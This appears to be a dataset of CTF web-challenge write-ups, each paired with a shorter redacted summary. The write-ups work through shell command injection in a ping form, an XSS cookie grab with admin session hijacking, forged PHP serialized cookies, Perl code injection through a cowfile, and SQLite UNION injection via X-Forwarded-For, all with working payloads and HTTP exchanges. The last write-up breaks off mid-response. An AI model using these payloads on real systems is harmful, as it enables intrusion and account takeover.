> by patacrep & pwndawan
> 
> Try out our new ping platform: http://lowdeep.insomnihack.ch/

## Solution

The website contains a page where you can insert an IP address to ping.

```html
<!DOCTYPE html>
<html lang=""en"">
<head>
  <title>Insomni'hack 2020 Teaser</title>
  <meta charset=""utf-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1"">
  <link rel=""stylesheet"" href=""https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"">
  <script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js""></script>
  <script src=""https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js""></script>
  <script src=""https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js""></script>
  <style>
  body {
 background-image: url(""_res_/img/skull-slim.png"");
 background-color: #cccccc;
}
  </style>
</head>

<body>
<div class=""container p-3 my-3 bg-dark text-white"">
  <h2>LowDeep Plateform </h2>
  <p>That's our new plateform to perform ping the easy way.</p>

  <form action=""#"" method=""post"">
    <div class=""form-group"">
      <label for=""ip"">Enter the IP address to ping:</label>
      <input type=""text"" class=""form-control"" id=""ip"" name=""ipaddr"">
    </div>
    <input type=""submit"" name=""submit"" value=""Submit"" class=""btn btn-primary"" />
    <div>
    	    </div>
  </form>
</div>
</body>
</html>
```

The `ping` command is launched via shell, so a command in the input field can be injected to execute arbitrary operations.

For example `127.0.0.1; ls -al` payload will give the following output.

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
total 28
drwxr-xr-x 3 root root 4096 Jan 17 09:57 .
drwxr-xr-x 3 root root 4096 Jan 7 16:52 ..
drwxr-xr-x 4 root root 4096 Jan 17 09:57 _res_
-rw-r--r-- 1 root root 1367 Jan 16 15:30 index.php
-rw-r--r-- 1 root root 6128 Jan 16 13:10 print-flag
-rw-r--r-- 1 root root 42 Jan 16 15:35 robots.txt 
```

Accessing to `http://lowdeep.insomnihack.ch/print-flag` will download the [`print-flag` file](print-flag).

Using `strings` will print the flag.

```
root@m3ss4p0:~# strings print-flag
/lib64/ld-linux-x86-64.so.2
O0\)
libc.so.6
puts
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}
;*3$""
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

So the flag is the following.

```
INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}
```","The website contains a page where you can insert an IP address to ping.

The `ping` command is launched via shell, so a command in the input field can be injected to execute arbitrary operations.

Accessing to `print-flag` will download the `print-flag` file].

Using `strings` will print the flag."
"# m0leCon CTF 2019 – Math magazine

* **Category:** web
* **Points:** 55

## Challenge

> Do you like math? Click here.
>
> Author: @andreossido
>
> http://10.255.0.1:8011/

## Solution

Connecting to the website you can see the following message.

```
Welcome!

This site is a math articles container.
At the moment you can only read your articles and write new ones.
Only admin can read other account articles, so pay attention what do you write :)
```

This website allows you to upload LaTeX documents and to list and view your uploaded ones. The view functionality doesn't escape/encode the output and the text field where you can write your LaTeX script doesn't sanitize the input; as a consequence, the website is vulnerable to XSS.

```latex
\documentclass{article}
\begin{document}

<script>alert();</script>

\end{document}
```

You can abuse this, in order to print administrator cookies, with the following payload.

```latex
\documentclass{article}
\begin{document}

<script>alert(document.cookie);</script>

\end{document}
```

When the article is submitted, the following output is shown.

```
WARN: Published, but admin cannot view you article :(
Error:
[*] Going to visit url: http://10.255.0.1:8011/?p=articles&a=view&u_id=f2c41083389d45ee757cc8f65eb2afd4&id=11
[*] Getting FLAG...

Alert Text: None
Message: unexpected alert open: {Alert text : PHPSESSID=aec0e26f10db41a5b584483bdc67dab1; FLAG=ptm{the_flag_is_not_here}}
(Session info: headless chrome=75.0.3770.100)
```

But the flag is not the real one.

Analyzing the HTML, you can discover the following interesting comment.

```html
<!--
    <li class=""nav-item"">
        (Not used anymore, but I left it here for historical reasons)
        <a class=""nav-link"" href=""./src.zip"">Source</a>
    </li>
-->
```

So you can download the [src.zip](src.zip) file.

Analyzing the [list](./src/pages/articles.actions/list) source code, you can discover an interesting `if` statement, where the real flag is set into a cookie.

```php
<?php
	if(isset($_COOKIE['FLAG']) && $_COOKIE['FLAG'] === FALSE_FLAG && $_SESSION['SECRET'] === SECRET){
		setCookie('FLAG', FLAG, time() + 100, '/');
	}

	$f = new ArticleFactory(USER);
?>
```

At this point you have already leaked the `FALSE_FLAG`, so you can force it into a cookie. You don't have `SECRET` value into your session, but you have the `PHPSESSID` of the administrator, so you can steal its session changing your cookie.

Crafting both cookies accordingly and accessing to the `list` functionality will give you the flag into the `FLAG` cookie.

```
ptm{L4t3x_1nj3ct10n_1s_c00l}
```

**Note**: According to the challenge creator, the technique to leak `PHPSESSID` and false `FLAG` was not the *intended* one.","Connecting to the website you can see a message.

This website allows you to upload LaTeX documents and to list and view your uploaded ones. The view functionality doesn't escape/encode the output and the text field where you can write your LaTeX script doesn't sanitize the input; as a consequence, the website is vulnerable to XSS.

You can abuse this, in order to print administrator cookies, with the following payload.

[LaTeX code containing a potentially malicious JavaScript script that attempts to extract the user's browser cookies.]

When the article is submitted a Warning message is shown.

Analyzing the HTML, you can discover a ref to an interesting file src.zip so you can download it.

Analyzing the source code, you can discover an interesting `if` statement, where the real flag is set into a cookie.

At this point you have already leaked the `FALSE_FLAG`, so you can force it into a cookie. You don't have `SECRET` value into your session, but you have the `PHPSESSID` of the administrator, so you can steal its session changing your cookie.

Crafting both cookies accordingly and accessing to the `list` functionality will give you the flag into the `FLAG` cookie."
"# m0leCon CTF 2019 – OOP Admin Panel

* **Category:** web
* **Points:** 54

## Challenge

> This is my first website, can you prove it to be secure?
>
> Author: @andreossido
>
> http://10.255.0.1:8010/

## Solution

Connecting to the website you can see the following message.

```
Welcome

I'm admin of this site.
This is my first website... I think it's enough secure, but I didn't study sql yet.
Can you test it for me?
In private page there is a surprise for you!
```

Registering a user and analyzing the cookies will let you to discever the `login` cookie with a base64 content.

```
Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtpOjI7czo4OiJ1c2VybmFtZSI7czo1OiJhYWFhYSI7czo1OiJhZG1pbiI7YjowO30=
```

Decoding it will give you the following PHP serialized class.

```
O:4:""User"":3:{s:2:""id"";i:2;s:8:""username"";s:5:""aaaaa"";s:5:""admin"";b:0;}
```

You can craft the following malicious serialized class to escalate privileges.

```
O:4:""User"":3:{s:2:""id"";i:1;s:8:""username"";s:5:""admin"";s:5:""admin"";b:1;}
```

Then encode it in base64.

```
Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7czo1OiJhZG1pbiI7YjoxO30
```

Changing the cookie with the encoded malicious payload and visiting the private section will give you the flag.

```
ptm{Cl455_S3r14l1z4t10n_15_B34ut1ful}
```","Connecting to the website you can see a message with an hint.

Registering a user and analyzing the cookies will let you to discever the `login` cookie with a base64 content.

Decoding it will give you the User PHP serialized class.

You can craft the malicious serialized class to escalate privileges.

Then encode it in base64.

Changing the cookie with the encoded malicious payload and visiting the private section will give you the flag."
"# OverTheWire Advent Bonanza – mooo

* **Category:** web
* **Points:** 98

## Challenge

> 'Moo may represent an idea, but only the cow knows.' - Mason Cooley
settings
> 
> Service: http://3.93.128.89:1204
> 
> Author: semchapeu

## Solution

The website allows to use [cowsay 3.03+dfsg2-4](https://launchpad.net/ubuntu/bionic/amd64/cowsay/3.03+dfsg2-4) command to print messages.

There is a functionality to create your own cowfile: `http://3.93.128.89:1204/cow_designer`.

Cowfiles are like [the following](https://github.com/bkendzior/cowfiles/blob/master/bearface.cow).

```perl
##
## acsii picture from http://www.ascii-art.de/ascii/ab/bear.txt
##
$eye = chop($eyes);
$the_cow = <<EOC;
 $thoughts
  $thoughts
     .--.              .--.
    : (\\ "". _......_ ."" /) :
     '.    `        `    .'
      /'   _        _   `\\
     /     $eye}      {$eye     \\
    |       /      \\       |
    |     /'        `\\     |
     \\   | .  .==.  . |   /
      '._ \\.' \\__/ './ _.'
      /  ``'._-''-_.'``  \\
EOC
```

Considering that you can write your own, probably that one is represented following this format and the string you pass to the cow designer functionality is appended after `$the_cow` variable.

You can try to modify the content of that file with a code like the following.

```perl
EOCA$eyes=`ls`;print ""$eyes"";
```

The `A` letter is a placeholder that with a proxy must be changed to ``\n (`0x0a`). Furthermore, due to a restriction in the functionality, you can only use variables already defined into the Perl script, like `$eyes`.

You can use the following HTTP request to enumerate the directory content.

```
POST /cow_designer HTTP/1.1
Host: 3.93.128.89:1204
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: http://3.93.128.89:1204
Connection: close
Referer: http://3.93.128.89:1204/cow_designer
Cookie: session=.eJyrVkouLS7Jz41Pzi9XslJKyClOUNJRSq1MLUbwSvLz0ktTYfxaAMTyEP8.Xeeu7A.HifJJrvsmNcHgfIYXZNFlPfocqs
Upgrade-Insecure-Requests: 1

message=message&custom_cow=EOC
$eyes=`ls`;print ""$eyes"";&eyes=ee&tongue=tt

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 Dec 2019 18:52:30 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Set-Cookie: session=eyJjdXN0b21fY293IjoiRU9DXG4kZXllcz1gbHNgO3ByaW50IFwiJGV5ZXNcIjsiLCJleWVzIjoiZWUiLCJ0b25ndWUiOiJ0dCJ9.XegAbg.EMqHGbwtgY3BiQ9ulqMh74tdZ-Y; HttpOnly; Path=/
Content-Length: 720

<!DOCTYPE html>
<html>
<head>
    <link href=""/static/style.css"" rel=""stylesheet"" type=""text/css"" />
</head>

<body>
    <h1>Mooo!</h1>
    <form action=""/cow_designer"" method=""POST"">
        Message:
        <input type=""text"" name=""message"" value=""message""><br> 
        Cow:<br>
        <textarea rows=""8"" cols=""40"" name=""custom_cow"">
EOC
$eyes=`ls`;print &#34;$eyes&#34;;
        </textarea><br>
        Eyes:
        <input type=""text"" name=""eyes"" value=""ee""><br>
        Tongue:
        <input type=""text"" name=""tongue"" value=""tt""><br> 
        <input type=""submit"" value=""say"">
    </form>
    
    
    <div><pre>flag
server.py
templates
 _________
&lt; message &gt;
 ---------
</pre></div>
    
</body>

</html>
```

And you can use the following request HTTP to print the flag file.

```
POST /cow_designer HTTP/1.1
Host: 3.93.128.89:1204
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://3.93.128.89:1204
Connection: close
Referer: http://3.93.128.89:1204/cow_designer
Cookie: session=.eJyrVkouLS7Jz41Pzi9XslJKyClOUNJRSq1MLUbwSvLz0ktTYfxaAMTyEP8.Xeeu7A.HifJJrvsmNcHgfIYXZNFlPfocqs
Upgrade-Insecure-Requests: 1

message=message&custom_cow=EOC
$eyes=`cat flag`;print ""$eyes"";&eyes=ee&tongue=tt

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 Dec 2019 18:53:16 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Set-Cookie: session=eyJjdXN0b21fY293IjoiRU9DXG4kZXllcz1gY2F0IGZsYWdgO3ByaW50IFwiJGV5ZXNcIjsiLCJleWVzIjoiZWUiLCJ0b25ndWUiOiJ0dCJ9.XegAnA.U8mwtSnPeAaqSKFzmuJqy-962Xo; HttpOnly; Path=/
Content-Length: 733

<!DOCTYPE html>
<html>
<head>
    <link href=""/static/style.css"" rel=""stylesheet"" type=""text/css"" />
</head>

<body>
    <h1>Mooo!</h1>
    <form action=""/cow_designer"" method=""POST"">
        Message:
        <input type=""text"" name=""message"" value=""message""><br> 
        Cow:<br>
        <textarea rows=""8"" cols=""40"" name=""custom_cow"">
EOC
$eyes=`cat flag`;print &#34;$eyes&#34;;
        </textarea><br>
        Eyes:
        <input type=""text"" name=""eyes"" value=""ee""><br>
        Tongue:
        <input type=""text"" name=""tongue"" value=""tt""><br> 
        <input type=""submit"" value=""say"">
    </form>
    
    
    <div><pre>AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O} _________
&lt; message &gt;
 ---------
</pre></div>
    
</body>

</html>
```

The flag is the following.

```
AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}
```","The website allows to use cowsay command to print messages.

There is a functionality to create your own cowfile.

Considering that you can write your own, probably that one is represented following this format and the string you pass to the cow designer functionality is appended after `$the_cow` variable.

You can try to modify the content of that file with a code like the following.

[Perl code that lists the files in the current directory and prints their names.]

The `A` letter is a placeholder that with a proxy must be changed to ``\n (`0x0a`). Furthermore, due to a restriction in the functionality, you can only use variables already defined into the Perl script, like `$eyes`.

You can use an HTTP request to enumerate the directory content.

And another HTTP request to print the flag file."
"# Quals Saudi and Oman National Cyber Security CTF 2019 – Back to basics

* **Category:** Web Security
* **Points:** 50

## Challenge

> not pretty much many options. No need to open a link from a browser, there is always a different way
>
> [http://35.197.254.240/backtobasics](http://35.197.254.240/backtobasics)

## Solution

Opening the URL with browser will redirect to Google.

*curl* should be used to GET the page.

```
$ curl -X GET -i http://35.197.254.240/backtobasics/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Thu, 07 Feb 2019 20:44:45 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Allow: GET, POST, HEAD,OPTIONS


<script> document.location = ""http://www.google.com""; </script>
```

The URL seems to allow following HTTP operations: `GET`, `POST`, `HEAD`, `OPTIONS`.

Using `POST` will return the following.

```
$ curl -X POST -i http://35.197.254.240/backtobasics/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Thu, 07 Feb 2019 20:42:56 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Allow: GET, POST, HEAD,OPTIONS

<!--
var _0x7f88=["""",""join"",""reverse"",""split"",""log"",""ceab068d9522dc567177de8009f323b2""];function reverse(_0xa6e5x2){flag= _0xa6e5x2[_0x7f88[3]](_0x7f88[0])[_0x7f88[2]]()[_0x7f88[1]](_0x7f88[0])}console[_0x7f88[4]]= reverse;console[_0x7f88[4]](_0x7f88[5])
-->
```

The returned JavaScript can be written like the following to retrieve the flag.

```javascript
var _0x7f88=["""",""join"",""reverse"",""split"",""log"",""ceab068d9522dc567177de8009f323b2""];

function reverse(_0xa6e5x2) {
  flag= _0xa6e5x2[_0x7f88[3]](_0x7f88[0])[_0x7f88[2]]()[_0x7f88[1]](_0x7f88[0])
  console.log(flag)
}

//console[_0x7f88[4]]= reverse;
//console[_0x7f88[4]](_0x7f88[5]);
reverse(_0x7f88[5]);
```

The flag is the following.

```
2b323f9008ed771765cd2259d860baec
```","Opening the URL with browser will redirect to Google.

curl should be used to GET the page.

The URL seems to allow following HTTP operations: `GET`, `POST`, `HEAD`, `OPTIONS`.

Using `POST` will return some javascript code.

The returned JavaScript can be written to retrieve the flag."
"# Quals Saudi and Oman National Cyber Security CTF 2019 – Maria

* **Category:** Web Security
* **Points:** 200

## Challenge

> Maria is the only person who can view the flag
>
> [http://35.222.174.178/maria/](http://35.222.174.178/maria/)

## Solution

*curl* will return the following web page.

```
$ curl -i http://35.222.174.178/maria/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 09:16:21 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=hukf0bvotd1htofsbr7r6qgjd0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0
Transfer-Encoding: chunked

SELECT * FROM nxf8_sessions where ip_address = 'xxx.xxx.xxx.xxx'<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""utf-8"">
    <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1"">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Welcome to our website</title>

    <!-- Bootstrap -->
    <link rel=""stylesheet"" href=""https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"" integrity=""sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"" crossorigin=""anonymous"">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src=""https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js""></script>
      <script src=""https://oss.maxcdn.com/respond/1.4.2/respond.min.js""></script>
    <![endif]-->
  </head>
  <body>
    <nav class=""navbar navbar-inverse navbar-fixed-top"">
      <div class=""container"">
        <div class=""navbar-header"">
          <button type=""button"" class=""navbar-toggle collapsed"" data-toggle=""collapse"" data-target=""#navbar"" aria-expanded=""false"" aria-controls=""navbar"">
            <span class=""sr-only"">Toggle navigation</span>
            <span class=""icon-bar""></span>
            <span class=""icon-bar""></span>
            <span class=""icon-bar""></span>
          </button>
          <a class=""navbar-brand"" href=""#"">Maria Website</a>
        </div>
        <div id=""navbar"" class=""navbar-collapse collapse"">

        </div><!--/.navbar-collapse -->
      </div>
    </nav>
    <div class=""alert alert-info"" style=""margin: 50px 0 0 0;"">
        Privacy Note: Your IP is stored in our database for a security tracking reasons.
    </div>

    <div class=""jumbotron"">
      <div class=""container"">
        <h1>Welcome to our website!</h1>
        <p>Say hi to Maria! its the only person who can reveal the flag</p>
              </div>
    </div>

  </body>
</html>
```

At the beginning of the HTML page you can find a sql query with your IP address in it.

```
SELECT * FROM nxf8_sessions where ip_address = 'xxx.xxx.xxx.xxx'
```

Using the `X-FORWARDED-FOR` HTTP header that parameter can be manipulated, furthermore it is vulnerable to SQL injection.

```
$ curl -X GET --header ""X-FORWARDED-FOR: '"" -i http://35.222.174.178/maria/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 14:20:34 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=11keda1pk9cr4un12esv95iji3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Transfer-Encoding: chunked

SELECT * FROM nxf8_sessions where ip_address = '''Error : HY000 1 unrecognized token: ""'''""
```

The database seems to be a *SQLite*.

After some analysis you can discover that the result of the executed query is used to populate the `PHPSESSID` cookie.

Crafting a `UNION` SQL operation with `null` allows you to discover the user table and the number of columns to union.

```
$ curl -X GET --header ""X-FORWARDED-FOR: pwnd' union select null, null, null, null from nxf8_users where '1'='1"" -i http://35.222.174.178/maria/
```

Furthermore, you can discover which is the position of the column used to return data: it's the last one.

```
$ curl -X GET --header ""X-FORWARDED-FOR: pwnd' union select null, null, null, password from nxf8_users where '1'='1"" -i http://35.222.174.178/maria/
```

Now you can extract information and see results into `PHPSESSID` cookie.

You can discover that there are only two tables: `nxf8_users` and `nxf8_sessions`.

```
$ curl -X GET --header ""X-FORWARDED-FOR: pwnd' union select null, null, null, count(name) from sqlite_master where type='table"" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 14:56:50 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=mqq6c43oi4u7tfbgfdh6htq4f3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=2; expires=Fri, 08-Feb-2019 15:56:50 GMT; Max-Age=3600
```

Flag could be into Maria's record, so you can enumerate colums of user table.

```
$ curl -X GET --header ""X-FORWARDED-FOR: pwnd' union select null, null, null, sql from sqlite_master where tbl_name = 'nxf8_users' and type='table"" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 14:59:52 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=2k36knnec6idjsllv8fu98mdm7; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=CREATE+TABLE+%22nxf8_users%22+%28%0A++++++++++++%22id%22+int%2810%29+NOT+NULL%2C%0A++++++++++++%22name%22+varchar%28255%29++NOT+NULL%2C%0A++++++++++++%22email%22+varchar%28255%29++NOT+NULL%2C%0A++++++++++++%22password%22+varchar%28255%29++NOT+NULL%2C%0A++++++++++++%22role%22+varchar%28100%29++DEFAULT+NULL%0A++++++++%29; expires=Fri, 08-Feb-2019 15:59:52 GMT; Max-Age=3600
```

Unfortunately passwords are random numbers, so they are not related to the flag. Nothing interesting found into the user table, even into other user records. Probably the flag is into the sessions table. 

```
$ curl -X GET --header ""X-FORWARDED-FOR: pwnd' union select null, null, null, sql from sqlite_master where tbl_name = 'nxf8_sessions' and type='table"" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 15:03:37 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=r5sqesbreu84v0i6nh8pc6pd54; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=CREATE+TABLE+%22nxf8_sessions%22+%28%0A++++++++++++%22id%22+int%2810%29+NOT+NULL%2C%0A++++++++++++%22user_id%22+varchar%28255%29++NOT+NULL%2C%0A++++++++++++%22ip_address%22+varchar%28255%29+NOT+NULL%2C%0A++++++++++++%22session_id%22+varchar%28255%29++NOT+NULL%0A++++++++%29; expires=Fri, 08-Feb-2019 16:03:37 GMT; Max-Age=3600
Transfer-Encoding: chunked
```

Analyzing the composition of the sessions table you can discover that you need a value for the `user_id` column which is the foreign key to the user table.

The `id` of Maria can be easily retrieved from user table: it is `5`.

```
$ curl -X GET --header ""X-FORWARDED-FOR: pwnd' union select null, null, null, id from nxf8_users where name = 'Maria"" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 15:02:30 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=jh9oqonbml52kcql01se744lq2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=5; expires=Fri, 08-Feb-2019 16:02:30 GMT; Max-Age=3600
Transfer-Encoding: chunked
```

At this point you can find Maria's session ID.

```
$ curl -X GET --header ""X-FORWARDED-FOR: pwnd' union select null, null, null, session_id from nxf8_sessions where user_id = 5 and '1'='1"" -i http://35.222.174.178/maria/

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 15:06:38 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=len8nngjbl4ljrn7c7n7fp9fc4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=fd2030b53fc9a4f01e6dbe551db7ded390461968; expires=Fri, 08-Feb-2019 16:06:38 GMT; Max-Age=3600
Transfer-Encoding: chunked
```

This is not the flag, but *only Maria can see the flag*, so you can impersonate Maria changing your `PHPSESSID` cookie into your browser.

This will reveal the flag refreshing the page.

```
aj9dhAdf4
```","curl will return a web page.

At the beginning of the HTML page you can find a sql query with your IP address in it.

Using the `X-FORWARDED-FOR` HTTP header that parameter can be manipulated, furthermore it is vulnerable to SQL injection.

The database seems to be a SQLite.

After some analysis you can discover that the result of the executed query is used to populate the `PHPSESSID` cookie.

Crafting a `UNION` SQL operation with `null` allows you to discover the user table and the number of columns to union.

Furthermore, you can discover which is the position of the column used to return data.

Now you can extract information and see results into `PHPSESSID` cookie.

You can discover that there are only two tables..

Flag could be into Maria's record, so you can enumerate colums of user table.

Unfortunately passwords are random numbers, so they are not related to the flag. Nothing interesting found into the user table, even into other user records. Probably the flag is into the sessions table. 

Analyzing the composition of the sessions table you can discover that you need a value for the `user_id` column which is the foreign key to the user table.

The `id` of Maria can be easily retrieved from user table.

At this point you can find Maria's session ID.

This is not the flag, but only Maria can see the flag, so you can impersonate Maria changing your `PHPSESSID` cookie into your browser.

This will reveal the flag refreshing the page."
"# RITSEC CTF 2019 – Buckets of fun

* **Category:** web
* **Points:** 100

## Challenge

> http://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/
> 
> Author: scriptingislife

## Solution

The title of the challenge is a hint to insecure/public AWS S3 buckets, so [S3Scanner](https://github.com/sa7mon/S3Scanner) can be used to easily dump the content.

```
root@m3ss4p0:~# git clone https://github.com/sa7mon/S3Scanner.git
root@m3ss4p0:~# cd S3Scanner/
root@m3ss4p0:~/S3Scanner# chmod u+x s3scanner.py
root@m3ss4p0:~/S3Scanner# pip install -r requirements.txt 
root@m3ss4p0:~/S3Scanner# python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com
root@m3ss4p0:~/S3Scanner# cd buckets/bucketsoffun-ctf/
root@m3ss4p0:~/S3Scanner/buckets/bucketsoffun-ctf# ll
totale 8
-rw-r--r-- 1 root root 630 nov 16 09:15 index.html
-rw-r--r-- 1 root root  25 nov 16 09:15 youfoundme-asd897kjm.txt
root@m3ss4p0:~/S3Scanner/buckets/bucketsoffun-ctf# cat youfoundme-asd897kjm.txt
RITSEC{LIST_HIDDEN_FILES}
```

The flag is the following.
```
RITSEC{LIST_HIDDEN_FILES}
```","The title of the challenge is a hint to insecure AWS S3 buckets, so S3Scanner can be used to easily dump the content.

[A sequence of command-line instructions showing how to use the S3Scanner tool to search for Open S3 buckets on Amazon Web Services and how to extract data from them.]

The flag is the following.
"
"# RITSEC CTF 2019 – misdirection

* **Category:** web
* **Points:** 100

## Challenge

> Looks like someone gave you the wrong directions!
>
> http://ctfchallenges.ritsec.club:5000/
>
> Flag format is RS{ }
>
> Author: f1rehaz4rd

## Solution

Connecting to the website, you will experience multiple redirections from one page to another.

![screen.png](screen.png)

Each page has one letter for the name. Analyzing the requested pages and tuning the starting point of the redirection, you can discover the full flag one char at a time.

The flag is the following.
```
RS{4!way5_Ke3p-m0v1ng}
```","Connecting to the website, you will experience multiple redirections from one page to another.

Each page has one letter for the name. Analyzing the requested pages and tuning the starting point of the redirection, you can discover the full flag one char at a time."
"# RITSEC CTF 2019 – Our First API

* **Category:** web
* **Points:** 417

## Challenge

> ctfchallenges.ritsec.club:3000 ctfchallenges.ritsec.club:4000
>
> Hint: You don't need the Bearer keyword!
> 
> Author: sandw1ch

## Solution

Connecting to [http://ctfchallenges.ritsec.club:3000/](http://ctfchallenges.ritsec.club:3000/) will give the following message.

```
This page is only for authentication with our api, located at port 4000!
```

Connecting to [http://ctfchallenges.ritsec.club:4000/](http://ctfchallenges.ritsec.club:4000/) will give the following message.

```
API Documentation

Below are some of the api endpoints that you can use. Please use them responsibly :)!
Use the format below to make your requests to the API.

Nodes 	Description
/api/admin 	

    For admin users to authenticate. Please provide us your authorization token given to you by the /auth endpoint. 

/api/normal 	

    For standard users to authenticate. Please provide us your authorization token given to you by the /auth endpoint. 

/auth 	

    Authentication endpoint on port 3000. Please send your name and this api will return your token for accessing the api! 
```

At this point you have references to an exposed API. Trying to connect to [http://ctfchallenges.ritsec.club:4000/api/normal](http://ctfchallenges.ritsec.club:4000/api/normal) will result in an error.

```
Forbidden, missing JWT authorization
```

So you can request a JWT using the `/auth` API and specifying a `name`.

```
GET http://ctfchallenges.ritsec.club:3000/auth?name=m3ssap0 HTTP/1.1
Accept-Encoding: gzip,deflate
Host: ctfchallenges.ritsec.club:3000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 16 Nov 2019 09:49:38 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 287
Connection: keep-alive
X-Powered-By: Express
ETag: W/""11f-JMdC/jocpabmtyWtX3112GAnmeM""

